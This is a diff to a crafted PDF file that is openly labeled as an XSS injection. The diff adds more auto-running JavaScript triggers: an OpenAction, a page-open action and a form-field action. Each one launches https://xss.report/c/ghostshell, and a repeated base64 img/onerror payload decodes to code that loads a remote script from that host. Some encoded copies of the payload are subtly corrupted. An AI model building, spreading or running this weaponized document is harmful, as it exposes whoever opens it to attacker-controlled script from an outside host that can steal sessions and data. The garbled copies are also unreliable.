@@ -1,37 +1,44 @@
 %PDF-1.4
-% Injecting XSS payload in comment
-% <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+% Advanced XSS Injection: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 7 0 R
+/Metadata 9 0 R
+/EmbeddedFiles [10 0 R]
+/AcroForm << /Fields [12 0 R] >>
+>>
+endobj
 2 0 obj
 <<
-/Kids[3 0 R]
-/Type/Pages
+/Type /Pages
+/Kids [3 0 R]
 /Count 1
 >>
 endobj
 3 0 obj
 <<
-/Type/Page
+/Type /Page
 /Resources 4 0 R
 /Contents 6 0 R
 /Parent 2 0 R
-/MediaBox[0 0 595.2756 841.8898]
 /Annots [8 0 R]
+/AA << /O 13 0 R >>
 >>
 endobj
 4 0 obj
 <<
-/Font<<
-  /F1 5 0 R
->>
+/Font << /F1 5 0 R >>
 >>
 endobj
 5 0 obj
 <<
-/Type/Font
-/BaseFont/Helvetica
-/Subtype/Type1
-/Encoding/WinAnsiEncoding
+/Type /Font
+/BaseFont /Helvetica
+/Subtype /Type1
+/Encoding /WinAnsiEncoding
 >>
 endobj
 6 0 obj
@@ -50,7 +57,7 @@ endobj
 <<
 /Type /Action
 /S /JavaScript
-/JS (app.alert\("XSS via PDF: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\("https://xss.report/c/ghostshell", true\);)
+/JS (var p = "PHNjcmlwdD5hbGVydCgnWFNTIFZpYSBQREYgT3BlbkFjdGlvbicpPC9zY3JpcHQ+"; app.alert\("XSS via PDF: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\("https://xss.report/c/ghostshell", true\);)
 >>
 endobj
 8 0 obj
@@ -100,18 +107,46 @@ stream
 <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmBoZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 endstream
 endobj
-1 0 obj
+12 0 obj
 <<
-/Pages 2 0 R
-/Type /Catalog
-/OpenAction 7 0 R
-/Metadata 9 0 R
-/EmbeddedFiles [10 0 R]
+/Type /Annot
+/Subtype /Widget
+/FT /Tx
+/F 2
+/Rect [50 400 250 430]
+/T (XSSField)
+/V (Click to trigger XSS)
+/A << 
+  /Type /Action
+  /S /JavaScript
+  /JS (app.alert\("XSS via Form: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\("https://xss.report/c/ghostshell", true\);)
 >>
+>>
+endobj
+13 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (var encoded = "aHR0cHM6Ly94c3MucmVwb3J0L2MvZ2hvc3RzaGVsbA=="; app.alert\("XSS via Page Open: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\(util.stringFromStream\(util.streamFromString\(encoded, "ascii"\)\), true\);)
+>>
+endobj
+14 0 obj
+<<
+/Type /ObjStm
+/N 1
+/First 10
+/Length 120
+>>
+stream
+15 0 obj
+<<
+/AlternateXSS (<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmBoZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>)
+>>
+endstream
 endobj
 
 xref
-0 12
+0 16
 0000000000 65535 f 
 0000000150 00000 n 
 0000000015 00000 n 
@@ -124,12 +159,16 @@ xref
 0000000500 00000 n 
 0000000600 00000 n 
 0000000700 00000 n 
+0000000800 00000 n 
+0000000900 00000 n 
+0000001000 00000 n 
+0000001100 00000 n 
 trailer
 <<
-/ID[(w4f) (w4f)]
+/ID [(w4f) (w4f)]
 /Root 1 0 R
-/Size 12
+/Size 16
 >>
 startxref
-800
+1200
 %%EOF
